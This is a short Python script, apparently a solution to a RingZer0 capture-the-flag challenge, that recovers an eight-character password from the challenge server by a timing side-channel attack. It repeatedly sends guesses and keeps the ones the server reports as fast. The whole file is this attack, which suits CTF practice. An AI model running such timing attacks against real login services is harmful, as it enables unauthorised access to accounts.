import socket

HOST = "challenges.ringzer0ctf.com"
PORT = 10066

POOL = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!?"
TIME_VALID = 0.008000
PASSWORD_LEN = 8

PASSWORD = "________"

def try_password_once(pwd):
    s = socket.create_connection((HOST, PORT))
    s.settimeout(3.0)
    banner = s.recv(4096)
    s.sendall((pwd + "\n").encode())
    resp = b""
    while True:
        chunk = s.recv(4096)
        resp += chunk
        if b"Server take" in resp or b"Password:" in resp:
            break
    s.close()
    text = resp.decode(errors="replace")
    return text.split()[4]

def find_position(letter):
    global PASSWORD 
    start_pwd = "________"
    for i in range(0, 8):
        pwd = start_pwd
        pwd = pwd[:i] + letter + pwd[i+1:]
        times = [] # répétitions d'appels
        for _ in range(0, 5):
            elapsed = try_password_once(pwd)
            times.append(elapsed)
        if float(min(times)) <= TIME_VALID: 
            print(f" [+] '{letter}' seems to appear in index {i}.")
            PASSWORD = PASSWORD[:i] + letter + PASSWORD[i+1:]

def test_password():
    for letter in POOL:
        pwd = letter*PASSWORD_LEN
        times = [] # répétitions d'appels
        for _ in range(0,5):
            elapsed = try_password_once(pwd)
            times.append(elapsed)
        if float(min(times)) <= TIME_VALID: 
            print(f" [+] '{letter}' seems to appear in password.")
            find_position(letter)

if __name__ == "__main__":
    test_password()
    print(PASSWORD)
